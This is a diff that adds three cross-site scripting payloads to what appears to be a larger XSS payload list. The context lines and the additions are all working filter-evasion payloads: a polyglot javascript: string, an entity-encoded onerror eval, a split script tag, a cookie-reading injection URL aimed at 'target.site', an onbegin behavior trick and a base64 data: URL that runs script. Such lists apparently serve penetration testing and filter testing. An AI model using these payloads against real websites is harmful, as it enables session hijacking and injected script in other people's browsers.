@@ -83,3 +83,6 @@ jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('XSS'))//%0D%0A%0d%0a//\x3csV
 <img onerror=&#x65;&#x76;&#x61;&#x6c;&#x28;&#x27;al&#x5c;u0065rt&#x28;1&#x29;&#x27;&#x29; src=a>
 <scr<object>ipt>alert(1)</script>
 https://target.site/account.php?page_id="><script>/*&seed=*/alert(document.cookie);/*&mode=*/</script>
+<b style=behavior:url(#default#time2) onbegin=alert(1)>
+<i onclick=alert(1)>Click here</i>
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Click here</a>
